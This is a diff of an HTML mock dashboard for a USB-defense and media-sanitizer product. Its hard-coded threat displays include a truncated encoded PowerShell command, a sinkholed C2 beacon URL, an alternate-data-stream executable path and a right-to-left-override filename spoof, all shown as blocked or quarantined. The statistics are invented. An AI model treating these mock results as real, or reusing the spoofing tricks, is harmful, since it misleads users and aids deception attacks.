@@ -3,115 +3,266 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>OmniConnect Sentinel | Zero-Trust Peripheral Defense Dashboard</title>
+  <title>OmniConnect Sentinel | Zero-Trust Peripheral Defense & NIST SP 800-88 Sanitizer</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div class="app-layout">
+  <div class="app-layout" id="appLayout">
     <!-- Top Navigation Bar -->
     <header class="topbar">
       <div class="brand">
         <div class="shield-badge">
-          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
             <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
             <path d="m9 12 2 2 4-4"/>
           </svg>
         </div>
         <div>
-          <h1 class="logo-title">OMNICONNECT <span>SENTINEL</span></h1>
-          <p class="logo-subtitle">Enterprise UMDF Interceptor & Pure-Rust Deep CDR Engine</p>
+          <div class="brand-line">
+            <h1 class="logo-title">OMNICONNECT <span class="highlight">SENTINEL</span></h1>
+            <span class="version-badge">v0.1.0-PROD</span>
+          </div>
+          <p class="logo-subtitle">Zero-Trust Peripheral Defense • Userspace UMDF Interceptor • NIST SP 800-88 Sanitizer</p>
         </div>
       </div>
 
+      <!-- Center Console Mode Switcher -->
+      <div class="console-mode-switcher" role="tablist">
+        <button id="modeSocBtn" class="mode-btn active" role="tab" aria-selected="true">
+          <span class="mode-icon">🛡️</span>
+          <span>SOC Analyst HUD</span>
+        </button>
+        <button id="modeKioskBtn" class="mode-btn" role="tab" aria-selected="false">
+          <span class="mode-icon">🚀</span>
+          <span>Air-Gapped Kiosk</span>
+        </button>
+      </div>
+
+      <!-- Right Header Enterprise Telemetry Status -->
       <div class="header-status">
-        <div class="status-indicator live">
+        <div class="status-indicator live" title="User-Mode Driver Framework v2 active in Ring 3 userspace">
           <span class="pulse-dot"></span>
-          <span>UMDF v2 INTERCEPTOR ACTIVE (Ring 3 Userspace)</span>
+          <span>UMDF RING 3 (Zero BSOD)</span>
+        </div>
+        <div class="enterprise-pills">
+          <span class="pill pill-intune" title="Microsoft Intune OMA-URI Profile Enforced">
+            <span class="pill-dot"></span> INTUNE COMPLIANT
+          </span>
+          <span class="pill pill-falcon" title="CrowdStrike Falcon FDR / CEF Syslog Stream Active">
+            <span class="pill-dot"></span> FALCON FDR
+          </span>
+          <span class="pill pill-vfs" title="Projected File System (ProjFS) Active on Drive Z:\">
+            <span class="pill-dot"></span> VFS: <code>Z:\</code>
+          </span>
         </div>
         <div class="node-id">NODE: <code>SN-EDGE-WIN11-01</code></div>
       </div>
     </header>
 
-    <!-- Main Grid Content -->
-    <main class="dashboard-grid">
-      <!-- Left Column: Interception & Peripheral Control -->
+    <!-- ===================================================================== -->
+    <!-- VIEW 1: SOC ANALYST HUD (TACTICAL COMMAND CENTER)                    -->
+    <!-- ===================================================================== -->
+    <main class="dashboard-grid view-panel active" id="socView">
+      
+      <!-- Quadrant 1: Hardware Interception Sentry & Isometric Pin Decoupler -->
       <section class="panel control-panel">
         <div class="panel-header">
           <h2><span class="icon">⚡</span> Peripheral Interception Sentry</h2>
-          <span class="tag tag-success">Zero BSOD</span>
+          <div class="header-actions">
+            <span class="tag tag-success">Pre-Mount Filter</span>
+            <span class="tag tag-cyan">Hardware Rooted</span>
+          </div>
         </div>
 
+        <div class="sentry-top-row">
+          <!-- Hardware Safe Charging Interlock Toggle -->
+          <div class="interlock-card">
+            <div class="interlock-header">
+              <div>
+                <span class="interlock-title">Hardware Safe Charging Interlock</span>
+                <p class="interlock-desc">Physically disconnect D+/D- data traces; maintain 5V VBUS power to stop BadUSB and juice jack exploits.</p>
+              </div>
+              <label class="toggle-switch" for="safeChargingToggle">
+                <input type="checkbox" id="safeChargingToggle" />
+                <span class="slider round"></span>
+              </label>
+            </div>
+            <div class="interlock-status" id="interlockStatusText">
+              <span class="status-badge status-monitoring">● UMDF FILTER ACTIVE (D+/D- Intercepted)</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Isometric Hardware Anatomy Visualizer (anatomy skill) -->
+        <div class="anatomy-container" id="anatomyContainer">
+          <div class="anatomy-header">
+            <span class="anatomy-title">USB CONTROLLER HARDWARE SCHEMATIC</span>
+            <span class="anatomy-readout" id="anatomyReadout">VBUS: 5.02V | D+/D-: 480 Mbps (FILTERED)</span>
+          </div>
+          
+          <div class="svg-stage">
+            <svg id="anatomySvg" viewBox="0 0 680 200" class="anatomy-svg">
+              <defs>
+                <linearGradient id="metalGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                  <stop offset="0%" stop-color="#475569"/>
+                  <stop offset="50%" stop-color="#1e293b"/>
+                  <stop offset="100%" stop-color="#0f172a"/>
+                </linearGradient>
+                <linearGradient id="vbusGrad" x1="0%" y1="0%" x2="100%" y2="0%">
+                  <stop offset="0%" stop-color="#10b981"/>
+                  <stop offset="100%" stop-color="#34d399"/>
+                </linearGradient>
+                <filter id="glowGreen" x="-20%" y="-20%" width="140%" height="140%">
+                  <feGaussianBlur stdDeviation="3" result="blur" />
+                  <feMerge>
+                    <feMergeNode in="blur"/>
+                    <feMergeNode in="SourceGraphic"/>
+                  </feMerge>
+                </filter>
+                <filter id="glowCyan" x="-20%" y="-20%" width="140%" height="140%">
+                  <feGaussianBlur stdDeviation="2.5" result="blur" />
+                  <feMerge>
+                    <feMergeNode in="blur"/>
+                    <feMergeNode in="SourceGraphic"/>
+                  </feMerge>
+                </filter>
+              </defs>
+
+              <!-- Host Motherboard (Left) -->
+              <rect x="20" y="30" width="130" height="140" rx="8" fill="url(#metalGrad)" stroke="#334155" stroke-width="2"/>
+              <text x="85" y="55" fill="#94a3b8" font-size="11" font-family="'JetBrains Mono'" text-anchor="middle" font-weight="600">HOST CONTROLLER</text>
+              <text x="85" y="75" fill="#64748b" font-size="9" font-family="'JetBrains Mono'" text-anchor="middle">UMDF v2 Filter</text>
+
+              <!-- Physical Connector Shell (Center Left) -->
+              <rect x="150" y="50" width="40" height="100" rx="4" fill="#334155" stroke="#475569" stroke-width="1.5"/>
+              
+              <!-- 4 Hardware Wire Traces -->
+              <!-- Line 1: VBUS (+5V Power) -->
+              <path id="wireVbus" d="M 190 70 L 470 70" stroke="#10b981" stroke-width="3" fill="none" filter="url(#glowGreen)"/>
+              <text x="210" y="64" fill="#34d399" font-size="9" font-family="'JetBrains Mono'" font-weight="600">VBUS (+5.0V Power)</text>
+
+              <!-- Line 2: D+ (Data Positive) with Mechanical Relay -->
+              <path id="wireDplusHost" d="M 190 95 L 310 95" stroke="#06b6d4" stroke-width="2.5" fill="none" filter="url(#glowCyan)"/>
+              <!-- Relay Switch D+ -->
+              <circle cx="310" cy="95" r="4" fill="#06b6d4"/>
+              <line id="relayArmDplus" x1="310" y1="95" x2="350" y2="95" stroke="#06b6d4" stroke-width="2.5" stroke-linecap="round"/>
+              <circle cx="350" cy="95" r="4" fill="#06b6d4"/>
+              <path id="wireDplusDev" d="M 350 95 L 470 95" stroke="#06b6d4" stroke-width="2.5" fill="none" filter="url(#glowCyan)"/>
+              <text x="210" y="90" fill="#22d3ee" font-size="9" font-family="'JetBrains Mono'">D+ (Data Positive)</text>
+
+              <!-- Line 3: D- (Data Negative) with Mechanical Relay -->
+              <path id="wireDminusHost" d="M 190 125 L 310 125" stroke="#06b6d4" stroke-width="2.5" fill="none" filter="url(#glowCyan)"/>
+              <!-- Relay Switch D- -->
+              <circle cx="310" cy="125" r="4" fill="#06b6d4"/>
+              <line id="relayArmDminus" x1="310" y1="125" x2="350" y2="125" stroke="#06b6d4" stroke-width="2.5" stroke-linecap="round"/>
+              <circle cx="350" cy="125" r="4" fill="#06b6d4"/>
+              <path id="wireDminusDev" d="M 350 125 L 470 125" stroke="#06b6d4" stroke-width="2.5" fill="none" filter="url(#glowCyan)"/>
+              <text x="210" y="120" fill="#22d3ee" font-size="9" font-family="'JetBrains Mono'">D- (Data Negative)</text>
+
+              <!-- Line 4: GND (Ground) -->
+              <path id="wireGnd" d="M 190 150 L 470 150" stroke="#64748b" stroke-width="2.5" fill="none"/>
+              <text x="210" y="145" fill="#94a3b8" font-size="9" font-family="'JetBrains Mono'">GND (Ground)</text>
+
+              <!-- Peripheral Device (Right) -->
+              <rect x="470" y="30" width="180" height="140" rx="8" fill="url(#metalGrad)" stroke="#334155" stroke-width="2"/>
+              <text x="560" y="55" fill="#f8fafc" font-size="11" font-family="'JetBrains Mono'" text-anchor="middle" font-weight="600">CONNECTED PERIPHERAL</text>
+              <text x="560" y="75" fill="#06b6d4" font-size="10" font-family="'JetBrains Mono'" text-anchor="middle" id="connectedDeviceName">SanDisk Ultra 3.0 (E:)</text>
+              <rect x="495" y="90" width="130" height="24" rx="4" fill="rgba(16, 185, 129, 0.15)" stroke="#10b981" stroke-width="1"/>
+              <text x="560" y="106" fill="#10b981" font-size="9" font-family="'JetBrains Mono'" text-anchor="middle" id="busPowerState">5V VBUS DRAWING 2.1A</text>
+              <text x="560" y="130" fill="#94a3b8" font-size="8.5" font-family="'JetBrains Mono'" text-anchor="middle" id="pinStateIndicator">DATA LINES: CONNECTED</text>
+              <text x="560" y="150" fill="#64748b" font-size="8" font-family="'JetBrains Mono'" text-anchor="middle">VID: 0x0781 | PID: 0x5581</text>
+            </svg>
+          </div>
+        </div>
+
+        <!-- Connection Matrix -->
         <div class="connection-matrix">
           <div class="matrix-item active">
             <div class="matrix-info">
-              <span class="matrix-icon">🔌</span>
+              <span class="matrix-icon">💾</span>
               <div>
-                <strong>USB / Thunderbolt / MTP</strong>
-                <small>Hardware descriptor filtering</small>
+                <strong>USB Mass Storage</strong>
+                <p>Sandisk Ultra (E:) — 14.8 GB FAT32</p>
               </div>
             </div>
-            <span class="badge badge-green">LOCKED & FILTERED</span>
+            <span class="badge badge-yellow">TRIPPED & QUARANTINED</span>
           </div>
 
-          <div class="matrix-item active">
+          <div class="matrix-item">
             <div class="matrix-info">
-              <span class="matrix-icon">📡</span>
+              <span class="matrix-icon">📱</span>
               <div>
-                <strong>Wi-Fi Direct / Local Area Network</strong>
-                <small>eBPF packet boundary sentry</small>
+                <strong>MTP / PTP Mobile Link</strong>
+                <p>Pixel 8 Pro (USB-C) — Direct Transfer</p>
               </div>
             </div>
-            <span class="badge badge-green">INSPECTING</span>
+            <span class="badge badge-gray">IDLE</span>
           </div>
 
-          <div class="matrix-item active">
+          <div class="matrix-item">
             <div class="matrix-info">
-              <span class="matrix-icon">📶</span>
+              <span class="matrix-icon">⚡</span>
               <div>
-                <strong>Bluetooth OBEX / PAN</strong>
-                <small>Zero-trust file transfer gate</small>
+                <strong>Thunderbolt PCIe Tunnel</strong>
+                <p>DMA Protection (IOMMU Level 4 Enforced)</p>
               </div>
             </div>
-            <span class="badge badge-green">MONITORED</span>
+            <span class="badge badge-green">LOCKED</span>
           </div>
-        </div>
 
-        <div class="hardware-toggle-box">
-          <div class="toggle-desc">
-            <strong>Hardware Data Pin Severance</strong>
-            <p>Force "Safe Charging Only" by severing USB D+/D- bulk pipes while maintaining VBUS 5V power.</p>
+          <div class="matrix-item">
+            <div class="matrix-info">
+              <span class="matrix-icon">⌨️</span>
+              <div>
+                <strong>BadUSB / HID Emulation</strong>
+                <p>Keystroke Injection Guard & Timing Filter</p>
+              </div>
+            </div>
+            <span class="badge badge-green">ARMED</span>
           </div>
-          <label class="switch">
-            <input type="checkbox" id="safeChargingToggle" />
-            <span class="slider round"></span>
-          </label>
-        </div>
-
-        <div class="vfs-status-card">
-          <div class="vfs-header">
-            <span>Sterile Virtual Filesystem (ProjFS)</span>
-            <span class="vfs-mount">VIRTUAL MOUNT: <code>Z:\</code></span>
-          </div>
-          <p class="vfs-sub">Physical volume <code>E:\</code> is held in raw read-only lock. Windows Explorer only sees disarmed files with <code>FILE_EXECUTE</code> revoked.</p>
         </div>
       </section>
 
-      <!-- Center Column: Drive Scanner & CDR Disarm Station -->
-      <section class="panel scan-panel">
+      <!-- Quadrant 2: Real-Time Drive Sweep & CDR Studio -->
+      <section class="panel scanner-panel">
         <div class="panel-header">
-          <h2><span class="icon">🛡️</span> Real-Time Drive Sweep & CDR Studio</h2>
-          <div class="panel-actions">
-            <input type="text" id="targetPath" class="path-input" value="E:\" placeholder="Drive Path (e.g. E:\)" />
-            <button id="btnScan" class="btn btn-primary">
-              <span class="btn-text">Execute Zero-Trust Sweep</span>
-            </button>
+          <h2><span class="icon">🔍</span> Real-Time Drive Sweep & CDR Studio</h2>
+          <span class="tag tag-accent">ProjFS Sterile Virtual Drive (Z:\)</span>
+        </div>
+
+        <div class="scan-controls">
+          <div class="target-input-group">
+            <label for="targetPath">Target Volume / Drive Letter:</label>
+            <div class="input-with-button">
+              <input type="text" id="targetPath" value="E:\" placeholder="e.g. E:\ or \\?\Volume{...}" />
+              <button id="btnScan" class="btn btn-primary">
+                <span class="btn-icon">⚡</span>
+                <span class="btn-text">Execute Zero-Trust Sweep</span>
+              </button>
+            </div>
           </div>
         </div>
 
-        <div class="stats-ribbon">
+        <!-- Scan Progress & Live Speed Meter -->
+        <div class="scan-progress-box" id="scanProgressBox" style="display: none;">
+          <div class="progress-labels">
+            <span id="scanProgressLabel">Deep CDR Engine Disarming...</span>
+            <span id="scanProgressPct">0%</span>
+          </div>
+          <div class="progress-bar-track">
+            <div class="progress-bar-fill" id="scanProgressBar"></div>
+          </div>
+          <div class="progress-metrics">
+            <span id="scanSpeedMetric">Rate: 182 MB/s</span>
+            <span id="scanTimeMetric">Elapsed: 0.12s</span>
+          </div>
+        </div>
+
+        <!-- Telemetry Stats Cards -->
+        <div class="stat-grid">
           <div class="stat-card">
             <div class="stat-val" id="statFiles">1,134</div>
             <div class="stat-label">Files Scanned</div>
@@ -122,48 +273,64 @@
           </div>
           <div class="stat-card stat-warn">
             <div class="stat-val" id="statVectors">33</div>
-            <div class="stat-label">LNK Exploits Neutralized</div>
+            <div class="stat-label">LNK Vectors Disarmed</div>
           </div>
           <div class="stat-card stat-clean">
             <div class="stat-val" id="statDisarmed">967</div>
-            <div class="stat-label">Clean Documents Disarmed</div>
+            <div class="stat-label">Clean Files Projected to Z:\</div>
           </div>
         </div>
 
+        <!-- Split-Screen Deep CDR Diff Studio Button -->
+        <div class="cdr-studio-banner">
+          <div class="cdr-banner-text">
+            <strong>Deep CDR Mathematical Disarm Studio</strong>
+            <p>Compare raw uncompressed AST structure vs reconstructed clean document.</p>
+          </div>
+          <button id="btnOpenCdrDiff" class="btn btn-sm btn-outline-cyan">
+            <span>🔬 Open Split-Screen CDR Diff</span>
+          </button>
+        </div>
+
+        <!-- Live Interception Feed Box -->
         <div class="scan-feed-box">
           <div class="feed-header">
-            <span>LIVE INTERCEPTION LOG</span>
-            <span class="feed-filter">Showing High-Risk Events</span>
+            <span>LIVE INTERCEPTION & CDR LOG</span>
+            <div class="feed-filters">
+              <button class="feed-filter-btn active" data-filter="all">All</button>
+              <button class="feed-filter-btn" data-filter="crit">Threats</button>
+              <button class="feed-filter-btn" data-filter="cdr">CDR Clean</button>
+            </div>
           </div>
           <div class="feed-logs" id="logContainer">
-            <div class="log-entry log-crit">
+            <div class="log-entry log-crit" data-type="crit">
               <span class="log-time">16:28:10</span>
               <span class="log-badge">VIRUS CONFIRMED</span>
               <span class="log-msg">Polymorphic Worm Cluster: 134 identical executables (229,376 bytes) [Trojan:Win32/Ramnit!pz]</span>
             </div>
-            <div class="log-entry log-warn">
+            <div class="log-entry log-warn" data-type="crit">
               <span class="log-time">16:28:11</span>
               <span class="log-badge">EXPLOIT BLOCKED</span>
-              <span class="log-msg">Exploit:Win32/CplLnk.A: 33 shortcut vectors stripped before shell parsing</span>
+              <span class="log-msg">Exploit:Win32/CplLnk.A: 33 shortcut vectors stripped before Windows Explorer shell parsing</span>
             </div>
-            <div class="log-entry log-success">
+            <div class="log-entry log-success" data-type="cdr">
               <span class="log-time">16:28:12</span>
               <span class="log-badge">CDR DISARMED</span>
-              <span class="log-msg">Corporate_Brief.pdf: Stripped /JavaScript tree & linearized in 4.6 ms</span>
+              <span class="log-msg">Corporate_Brief.pdf: Stripped /JavaScript tree & linearized in 4.6 ms; projected to Z:\</span>
             </div>
-            <div class="log-entry log-success">
+            <div class="log-entry log-success" data-type="cdr">
               <span class="log-time">16:28:13</span>
               <span class="log-badge">POLYGLOT REMOVED</span>
-              <span class="log-msg">EmployeeBadge.jpg: Truncated 49 bytes of overlay shellcode past EOF (FF D9)</span>
+              <span class="log-msg">Roadmap.jpg: Truncated 245 KB overlay PE executable past JPEG EOI (FF D9)</span>
             </div>
           </div>
         </div>
       </section>
 
-      <!-- Right Column: OpenSandbox Detonation & Threat Intel -->
+      <!-- Quadrant 3: Tier 2 OpenSandbox Detonation & Threat Intel -->
       <section class="panel sandbox-panel">
         <div class="panel-header">
-          <h2><span class="icon">🔬</span> Tier 2 OpenSandbox Detonator</h2>
+          <h2><span class="icon">🧪</span> Tier 2 OpenSandbox Detonator</h2>
           <span class="tag tag-accent">Air-Gapped MicroVM</span>
         </div>
 
@@ -174,53 +341,116 @@
               <code id="detonateTarget">suspicious_dropper.bin</code>
             </div>
             <div>
-              <strong>VM Profile:</strong>
+              <strong>Hypervisor Profile:</strong>
               <span class="badge badge-purple">win11-whvp-microvm</span>
             </div>
           </div>
-          <button id="btnDetonate" class="btn btn-secondary">Run MicroVM Behavioral Detonation</button>
+          <button id="btnDetonate" class="btn btn-secondary">
+            <span class="btn-icon">▶</span>
+            <span class="btn-text">Execute MicroVM Detonation</span>
+          </button>
         </div>
 
         <div class="sandbox-results" id="sandboxResults">
           <div class="verdict-banner banner-malicious">
-            <div class="verdict-title">VERDICT: MALICIOUS (Score: 100/100)</div>
-            <div class="verdict-desc">Process injection, persistence run-keys, and sinkholed C2 callouts caught.</div>
+            <div class="verdict-title">VERDICT: MALICIOUS (Risk Score: 100 / 100)</div>
+            <div class="verdict-desc">Process injection, persistence run-keys, anti-evasion timing bypass, and sinkholed C2 callouts caught.</div>
           </div>
 
-          <div class="mitre-section">
-            <h3>MITRE ATT&CK Matrix Mapping</h3>
-            <div class="mitre-badges">
-              <span class="mitre-tag" title="Process Injection: PE Injection">T1055.002 PE Injection (90%)</span>
-              <span class="mitre-tag" title="Registry Run Keys">T1547.001 Registry Persistence (85%)</span>
-              <span class="mitre-tag" title="Web Protocols C2">T1071.001 Web C2 (75%)</span>
-              <span class="mitre-tag" title="Removable Media Replication">T1091 USB Worm Replication (100%)</span>
-              <span class="mitre-tag" title="Sandbox Evasion">T1497.001 Anti-VM Checks (90%)</span>
+          <!-- Process Execution Tree -->
+          <div class="process-tree-section">
+            <h3>Process Execution Hierarchy</h3>
+            <div class="process-tree">
+              <div class="proc-node proc-root">
+                <span class="proc-icon">📁</span> <code>explorer.exe (PID: 3412)</code>
+                <div class="proc-child">
+                  <span class="proc-line">└─</span> <span class="proc-icon">⚠️</span> <code class="proc-warn">suspicious_dropper.bin (PID: 8192)</code>
+                  <div class="proc-grandchild">
+                    <span class="proc-line">├─</span> <span class="proc-icon">⚡</span> <code class="proc-crit">cmd.exe /c powershell -enc JABz... (PID: 9012) [BLOCKED]</code>
+                  </div>
+                  <div class="proc-grandchild">
+                    <span class="proc-line">└─</span> <span class="proc-icon">🛑</span> <code class="proc-crit">inject_payload.exe (PID: 9140) [TERMINATED]</code>
+                  </div>
+                </div>
+              </div>
             </div>
           </div>
 
+          <!-- MITRE ATT&CK Matrix Mapping -->
+          <div class="mitre-section">
+            <h3>MITRE ATT&CK Matrix Mapping (Removable Media Carrier)</h3>
+            <div class="mitre-badges">
+              <span class="mitre-tag" data-tech="T1091" title="Initial Access: Replication Through Removable Media">T1091 USB Worm (100%)</span>
+              <span class="mitre-tag" data-tech="T1055.002" title="Defense Evasion: PE Injection">T1055.002 PE Injection (90%)</span>
+              <span class="mitre-tag" data-tech="T1547.001" title="Persistence: Registry Run Keys">T1547.001 Persistence (85%)</span>
+              <span class="mitre-tag" data-tech="T1071.001" title="Command and Control: Web Protocols">T1071.001 Web C2 (75%)</span>
+              <span class="mitre-tag" data-tech="T1497.001" title="Discovery: Virtualization/Sandbox Evasion">T1497.001 Anti-VM (90%)</span>
+              <span class="mitre-tag" data-tech="T1564.004" title="Defense Evasion: NTFS File and Directory Permissions">T1564.004 NTFS ADS (96%)</span>
+            </div>
+          </div>
+
+          <!-- Air-Gapped Network Sinkhole Intercepts -->
           <div class="c2-section">
-            <h3>Air-Gapped Network Sinkhole Intercepts</h3>
+            <h3>Air-Gapped Network Sinkhole Intercepts (INetSim Trap)</h3>
             <div class="c2-logs">
-              <div><code>DNS INTERCEPT:</code> c2-telemetry-gateway.darknet-pool.org</div>
-              <div><code>C2 SINKHOLE:</code> http://c2-telemetry-gateway.darknet-pool.org/api/v1/beacon</div>
-              <div><code>ACTION:</code> Redirected to INetSim (Zero Egress to Internet)</div>
+              <div><code>DNS TRAP:</code> query <strong>c2-telemetry-gateway.darknet-pool.org</strong> → <code>127.0.0.1 (SINKHOLED)</code></div>
+              <div><code>HTTP POST:</code> <strong>http://c2-telemetry-gateway.darknet-pool.org/api/v1/beacon</strong> [Payload: 1.2 KB]</div>
+              <div><code>SECURITY VERDICT:</code> <strong>Zero Outbound Egress</strong> — Simulated 200 OK Handshake returned to payload.</div>
             </div>
           </div>
         </div>
       </section>
 
-      <!-- Bottom Panel: AES-256-GCM Quarantine Vault -->
+      <!-- Quadrant 4: NIST SP 800-88 Rev 1 Shredder & Quarantine Vault -->
       <section class="panel vault-panel">
         <div class="panel-header">
-          <h2><span class="icon">🔒</span> NIST SP 800-88 Rev 1 Shredder & Quarantine Vault</h2>
-          <span class="tag tag-cyan">Hardware Rooted (CSPRNG Overwrite & Zero Remanence)</span>
+          <h2><span class="icon">🔒</span> NIST SP 800-88 Rev 1 Cryptographic Shredder & Vault</h2>
+          <div class="header-actions">
+            <span class="tag tag-cyan">CSPRNG Multi-Pass Overwrite</span>
+            <span class="tag tag-purple">AES-256-GCM Vault</span>
+          </div>
         </div>
 
+        <!-- In-Place Sector Shredder Visualizer -->
+        <div class="shredder-visualizer-card">
+          <div class="shred-header-bar">
+            <div>
+              <span class="shred-headline">NIST SP 800-88 IN-PLACE SECTOR OVERWRITE VISUALIZER</span>
+              <p class="shred-sub">Hardware Block Wipe: Pass 1 (0x00) → Pass 2 (0xFF) → Pass 3 (CSPRNG Entropy) → Flush Cache.</p>
+            </div>
+            <div class="shred-controls">
+              <select id="shredAlgorithmSelect" class="shred-select">
+                <option value="nist-purge">NIST SP 800-88 Purge (3-Pass CSPRNG)</option>
+                <option value="nist-clear">NIST SP 800-88 Clear (1-Pass Zero-Fill)</option>
+                <option value="dod">DoD 5220.22-M (7-Pass Military)</option>
+                <option value="gutmann">Gutmann Algorithm (35-Pass Extreme)</option>
+              </select>
+              <button id="btnShredAll" class="btn btn-danger btn-sm">
+                <span>🔥 Shred All Quarantined Items</span>
+              </button>
+            </div>
+          </div>
+
+          <!-- Sector Visual Grid (64 interactive blocks) -->
+          <div class="sector-grid" id="sectorGrid">
+            <!-- Populated via JavaScript: 64 blocks -->
+          </div>
+
+          <div class="sector-legend">
+            <span><span class="leg-dot dot-infected"></span> Infected Block</span>
+            <span><span class="leg-dot dot-zero"></span> Pass 1 (0x00)</span>
+            <span><span class="leg-dot dot-one"></span> Pass 2 (0xFF)</span>
+            <span><span class="leg-dot dot-csprng"></span> Pass 3 (CSPRNG)</span>
+            <span><span class="leg-dot dot-sterile"></span> Sterile (Verified 0-Trace)</span>
+          </div>
+        </div>
+
+        <!-- Threat Quarantine Table -->
         <div class="vault-table-container">
-          <table class="vault-table">
+          <table class="vault-table" id="vaultTable">
             <thead>
               <tr>
-                <th>Threat Carrier</th>
+                <th>Threat Carrier Type</th>
                 <th>Target File Path</th>
                 <th>Exploit Vector / Carrier Details</th>
                 <th>Risk Score</th>
@@ -229,33 +459,33 @@
               </tr>
             </thead>
             <tbody>
-              <tr>
+              <tr id="row-1">
                 <td><span class="badge badge-red">POLYGLOT IMAGE</span></td>
-                <td>E:\Presentations\Roadmap.jpg</td>
+                <td class="cell-path">E:\Presentations\Roadmap.jpg</td>
                 <td>245 KB PE Executable (MZ) Appended Past JPEG EOI (0xFFD9)</td>
                 <td><span class="badge badge-red">98 / 100</span></td>
                 <td><code>T1027.001</code></td>
                 <td><button class="btn btn-sm btn-danger btn-shred" data-path="E:\Presentations\Roadmap.jpg">NIST SP 800-88 Shred</button></td>
               </tr>
-              <tr>
+              <tr id="row-2">
                 <td><span class="badge badge-red">NTFS ADS STREAM</span></td>
-                <td>E:\Contracts\Brief.docx:evil.exe</td>
+                <td class="cell-path">E:\Contracts\Brief.docx:evil.exe</td>
                 <td>Alternate Data Stream hidden inside benign Word document ($DATA)</td>
                 <td><span class="badge badge-red">96 / 100</span></td>
                 <td><code>T1564.004</code></td>
                 <td><button class="btn btn-sm btn-danger btn-shred" data-path="E:\Contracts\Brief.docx:evil.exe">NIST SP 800-88 Shred</button></td>
               </tr>
-              <tr>
+              <tr id="row-3">
                 <td><span class="badge badge-red">UNICODE BIDI SPOOF</span></td>
-                <td>E:\Invoices\receipt_‮cod.exe</td>
+                <td class="cell-path">E:\Invoices\receipt_&#x202E;cod.exe</td>
                 <td>Right-to-Left Override (U+202E) masquerading .exe as .doc</td>
                 <td><span class="badge badge-red">99 / 100</span></td>
                 <td><code>T1036.002</code></td>
-                <td><button class="btn btn-sm btn-danger btn-shred" data-path="E:\Invoices\receipt_‮cod.exe">NIST SP 800-88 Shred</button></td>
+                <td><button class="btn btn-sm btn-danger btn-shred" data-path="E:\Invoices\receipt_&#x202E;cod.exe">NIST SP 800-88 Shred</button></td>
               </tr>
-              <tr>
-                <td><span class="badge badge-orange">CPL SHORTCUT WORM</span></td>
-                <td>E:\autorun.inf</td>
+              <tr id="row-4">
+                <td><span class="badge badge-orange">AUTORUN WORM</span></td>
+                <td class="cell-path">E:\autorun.inf</td>
                 <td>Automount Shell Execution Payload (Ramnit Carrier)</td>
                 <td><span class="badge badge-orange">95 / 100</span></td>
                 <td><code>T1091</code></td>
@@ -267,13 +497,185 @@
       </section>
     </main>
 
+    <!-- ===================================================================== -->
+    <!-- VIEW 2: AIR-GAPPED KIOSK STATION (TOUCHSCREEN AIRLOCK CONSOLE)        -->
+    <!-- ===================================================================== -->
+    <main class="kiosk-container view-panel" id="kioskView">
+      <div class="kiosk-card">
+        <div class="kiosk-header">
+          <div class="kiosk-badge-icon">🛡️</div>
+          <h2>OMNICONNECT AIRLOCK SANITIZER</h2>
+          <p>Critical Infrastructure & SCADA Peripheral Clearance Station</p>
+        </div>
+
+        <div class="kiosk-steps">
+          <!-- Step 1: Insert Media -->
+          <div class="kiosk-step-box active" id="kioskStep1">
+            <div class="kiosk-step-num">1</div>
+            <div class="kiosk-step-content">
+              <h3>Connect Removable Media</h3>
+              <p>Insert USB Flash Drive, External SSD, or Thunderbolt drive into the secure write-blocker port.</p>
+              <div class="kiosk-drive-detected">
+                <span class="pulse-dot"></span>
+                <span>DRIVE DETECTED: <strong>SanDisk Ultra 3.0 (E:\) — 14.8 GB</strong></span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Step 2: Auto-Sanitize & Disarm -->
+          <div class="kiosk-step-box" id="kioskStep2">
+            <div class="kiosk-step-num">2</div>
+            <div class="kiosk-step-content">
+              <h3>Automated Zero-Trust Sanitization</h3>
+              <p>Applies pure-Rust Deep CDR across all files, strips macros/polyglots, and shreds malware via NIST SP 800-88.</p>
+              <button id="btnKioskSanitize" class="kiosk-big-btn">
+                <span>🚀 START HARDWARE DISARM & PURGE</span>
+              </button>
+            </div>
+          </div>
+
+          <!-- Step 3: Verified Clearance & Eject -->
+          <div class="kiosk-step-box" id="kioskStep3">
+            <div class="kiosk-step-num">3</div>
+            <div class="kiosk-step-content">
+              <h3>Security Clearance Certificate</h3>
+              <div class="kiosk-certificate" id="kioskCert" style="display: none;">
+                <div class="cert-stamp">PASSED • ZERO TRACE</div>
+                <div class="cert-details">
+                  <p>Certificate ID: <code>CERT-NIST-800-88-2026-9921</code></p>
+                  <p>Files Disarmed: <strong>967 Documents</strong> • Threats Shredded: <strong>134 Worms</strong></p>
+                  <p>Clean Mount: <code>Z:\ (ProjFS Verified)</code></p>
+                </div>
+                <button id="btnKioskEject" class="kiosk-eject-btn">
+                  <span>⏏ SAFE EJECT CLEAN MEDIA</span>
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <!-- ===================================================================== -->
+    <!-- MODAL: DEEP CDR SPLIT-SCREEN DIFF STUDIO                              -->
+    <!-- ===================================================================== -->
+    <div class="modal-overlay" id="cdrDiffModal" style="display: none;">
+      <div class="modal-container">
+        <div class="modal-header">
+          <div class="modal-title">
+            <span class="modal-icon">🔬</span>
+            <h3>Deep CDR Mathematical Disarm Studio</h3>
+          </div>
+          <button id="btnCloseCdrModal" class="modal-close-btn">&times;</button>
+        </div>
+
+        <div class="modal-body">
+          <div class="cdr-diff-container">
+            <!-- Left Pane: Untrusted Original AST -->
+            <div class="cdr-pane cdr-untrusted">
+              <div class="pane-header">
